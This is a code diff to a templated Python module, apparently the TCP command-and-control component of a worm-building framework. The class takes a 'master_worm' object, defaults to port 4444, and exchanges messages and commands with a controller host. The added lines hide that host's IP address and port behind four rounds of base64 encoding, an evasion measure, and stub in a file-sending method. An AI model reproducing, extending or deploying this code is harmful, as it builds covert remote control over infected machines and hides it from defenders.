@@ -4,10 +4,12 @@
 #!info##Basic TCP socket communication. Does not send or receive files. Handles sending and receiving messages and commands.
 #!hiveType##PySM
 #!lang##python
-#!Var##RT_ip##$IP_ADDR##Host ip address.##str
-#!Var##RT_port##4444##Host port number.##str
-#!Var##RT_encode##$SOCKET_ENCODE##Socket encode format##str
+#!pyType##module
+#!Var##PRT_ip##$IP_ADDR##Host ip address.##str
+#!Var##PRT_port##4444##Host port number.##str
+#!Var##PRT_encode##$SOCKET_ENCODE##Socket encode format##str
 
+import base64
 import socket
 import threading
 import queue
@@ -15,20 +17,34 @@ from time import sleep
 from typing import Union
 from random import randint
 
+{% set PRT_bencode_step = 4 %}
 
 class PyRawTcp2:
     MTYPES = "conn"
     STAND_TH = False
     def __init__(self, master_worm: object):
         self.worm = master_worm
+        self.encode_base_step = {{PRT_bencode_step}}
         self.input_send_msg = queue.Queue()
-        self.addr = ("{{RT_ip}}", {{RT_port}})
-        self.format = "{{RT_encode}}"
+        self.format = "{{PRT_encode}}"
+        self.addr = (f"{self._get_IP().decode(self.format)}", self._get_PORT())
         self.raw_len = 1024
         self._is_conn = False
         self.client = None
         self.pause_send = 0.2
         self.send_lock = threading.Lock()
+    
+    def _get_IP(self) -> str:
+        rip = {{pyTOOL.encodeBase64(PRT_ip, PRT_bencode_step)}}
+        for _ in range(self.encode_base_step):
+            rip = base64.b64decode(rip)
+        return rip
+    
+    def _get_PORT(self) -> int:
+        rp = {{pyTOOL.encodeBase64(PRT_port, PRT_bencode_step)}}
+        for _ in range(self.encode_base_step):
+            rp = base64.b64decode(rp)
+        return int(rp.decode(self.format))
     
     @property
     def is_conn(self) -> bool:
@@ -97,6 +113,9 @@ class PyRawTcp2:
     
     def send_msg(self, msg: str, *args, **kwargs) -> None:
         self.input_send_msg.put(msg)
+    
+    def send_file(self, fpath: str, *args, **kwargs) -> None:
+        pass
     
     def wait4conn(self, data: str) -> None:
         while not self.is_conn:
